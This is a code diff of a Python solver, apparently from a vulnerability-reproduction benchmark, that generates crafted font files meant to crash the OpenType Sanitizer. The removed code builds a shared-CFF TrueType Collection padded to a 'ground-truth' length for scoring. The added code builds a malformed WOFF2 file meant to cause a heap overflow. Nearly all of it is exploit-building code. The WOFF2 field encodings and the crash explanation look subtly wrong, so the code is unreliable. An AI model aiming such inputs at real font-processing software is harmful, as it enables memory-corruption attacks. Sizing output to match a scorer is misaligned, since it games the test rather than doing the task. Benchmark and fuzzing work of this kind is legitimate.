@@ -3,99 +3,71 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a Proof-of-Concept input to trigger a heap-use-after-free
-        vulnerability in the OpenType Sanitizer (OTS).
+        Generate a PoC that triggers the vulnerability.
 
-        The vulnerability is triggered by processing a TrueType Collection (TTC)
-        file where two fonts share the same CFF (Compact Font Format) table.
-        OTS incorrectly manages the lifetime of the parsed CFF object. It gets
-        freed after processing the first font but is then reused from a cache
-        for the second font, leading to a UAF during the serialization phase
-        in `ots::OTSStream::Write`.
+        Args:
+            src_path: Path to the vulnerable source code tarball
 
-        The PoC constructs such a TTC file. It contains:
-        1. A TTC header defining two fonts.
-        2. Both font entries point to the same offset table for an OTTO (CFF-based) font.
-        3. This shared font definition contains a CFF table and other minimal tables
-           (head, hhea, OS/2, etc.) required to pass initial validation and reach the
-           vulnerable code path.
-        4. The total size of the PoC is crafted to be 800 bytes, matching the
-           ground-truth length for a good score.
+        Returns:
+            bytes: The PoC input that should trigger the vulnerability
         """
-        
-        cff_data = b'\x01\x00\x04\x01'
-        os2_data = b'\x00' * 78
-        cmap_data = b'\x00' * 24
-        
-        head_data_arr = bytearray(b'\x00' * 54)
-        struct.pack_into('>L', head_data_arr, 8, 0x5F0F3CF5) # magicNumber
-        head_data = bytes(head_data_arr)
-        
-        hhea_data = b'\x00' * 36
-        hmtx_data = b'\x00' * 4
-        post_data = b'\x00\x03\x00\x00' + b'\x00' * 28
+        # The vulnerability is a heap buffer overflow in ots::OTSStream::Write,
+        # triggered by a malformed WOFF2 file that bypasses a size check.
+        # This is achieved by setting a table tag to 0, which causes the check
+        # `(it->first != 0)` to fail, skipping the validation that ensures
+        # a table's size fits within the allocated output buffer.
+        #
+        # PoC structure:
+        # 1. WOFF2 Header: Sets `total_sfnt_size` to a very small value (e.g., 1),
+        #    which allocates a tiny output buffer. `num_tables` is set to 1.
+        # 2. Table Directory: A single entry is crafted with:
+        #    - A `tag` of 0 to exploit the faulty check.
+        #    - A large `orig_length` to specify an oversized table.
+        #
+        # This configuration leads the sanitizer to attempt writing a large table
+        # into a small buffer, causing a heap overflow in `OTSStream::Write`.
+        # The "use-after-free" classification by ASan likely arises from an
+        # initial out-of-bounds read from the input buffer when fetching the
+        # (non-existent) oversized table data.
 
-        tables = {
-            b'CFF ': cff_data,
-            b'OS/2': os2_data,
-            b'cmap': cmap_data,
-            b'head': head_data,
-            b'hhea': hhea_data,
-            b'hmtx': hmtx_data,
-            b'post': post_data,
-        }
+        # Total PoC length: Header (48 bytes) + Directory Entry (16 bytes)
+        poc_len = 64
         
-        num_tables = len(tables)
-        ttc_header_size = 20
-        sfnt_header_size = 12
-        table_directory_size = num_tables * 16
-        headers_total_size = ttc_header_size + sfnt_header_size + table_directory_size
-        
-        other_tables_size = sum(len(d) for t, d in tables.items() if t != b'CFF ')
-        
-        target_size = 800
-        cff_data_size = target_size - headers_total_size - other_tables_size
-        tables[b'CFF '] = tables[b'CFF '].ljust(cff_data_size, b'\x00')
+        # WOFF2 Header (48 bytes, big-endian)
+        header = b'wOF2'                               # signature
+        header += struct.pack('>I', 0x00010000)         # flavor (TTF)
+        header += struct.pack('>I', poc_len)            # length of WOFF2 file
+        header += struct.pack('>H', 1)                  # num_tables
+        header += struct.pack('>H', 0)                  # reserved
+        header += struct.pack('>I', 1)                  # total_sfnt_size (small output buffer)
+        header += struct.pack('>I', 0xFFFFFFFF)         # total_compressed_size (to pass another check)
+        header += struct.pack('>H', 0)                  # major_version
+        header += struct.pack('>H', 1)                  # minor_version
+        header += struct.pack('>I', 0) * 5              # meta_offset to priv_length
 
-        sorted_tags = sorted(tables.keys())
+        # Table Directory Entry (16 bytes, big-endian)
+        directory = b''
         
-        sfnt_offset = ttc_header_size
-        table_data_start_offset = sfnt_offset + sfnt_header_size + table_directory_size
-
-        poc = bytearray()
-        # TTC Header
-        poc += b'ttcf'
-        poc += struct.pack('>L', 0x00010000)
-        poc += struct.pack('>L', 2) # numFonts
-        poc += struct.pack('>L', sfnt_offset) # offset to font 1
-        poc += struct.pack('>L', sfnt_offset) # offset to font 2 (shared)
-
-        # SFNT Header (OTTO)
-        poc += b'OTTO'
-        entry_selector = 0
-        while (1 << (entry_selector + 1)) <= num_tables:
-            entry_selector += 1
-        search_range = (1 << entry_selector) * 16
-        range_shift = num_tables * 16 - search_range
-        poc += struct.pack('>HHHH', num_tables, search_range, entry_selector, range_shift)
-
-        table_directory = bytearray()
-        table_data_blob = bytearray()
+        # flags: 0x1f signals that a 4-byte tag follows
+        directory += struct.pack('>B', 0x1f)
         
-        current_data_offset = table_data_start_offset
-        for tag in sorted_tags:
-            data = tables[tag]
-            
-            # Table Record
-            table_directory += tag
-            table_directory += struct.pack('>L', 0) # checksum
-            table_directory += struct.pack('>L', current_data_offset)
-            table_directory += struct.pack('>L', len(data))
-            
-            table_data_blob += data
-            current_data_offset += len(data)
-            
-        poc += table_directory
-        poc += table_data_blob
+        # tag: 0 to bypass the size check
+        directory += struct.pack('>I', 0)
         
-        return bytes(poc)
+        # This size is derived from the vulnerability report's crash log.
+        large_size = 0xFF010233
+        
+        # orig_length: encoded as a 255UShort (0xFF prefix + 4-byte value)
+        directory += struct.pack('>B', 0xff)
+        directory += struct.pack('>I', large_size)
+        
+        # comp_offset: 0, encoded as a 255UShort
+        directory += struct.pack('>B', 0)
+        
+        # comp_length: same large value
+        directory += struct.pack('>B', 0xff)
+        directory += struct.pack('>I', large_size)
+        
+        poc = header + directory
+        
+        return poc
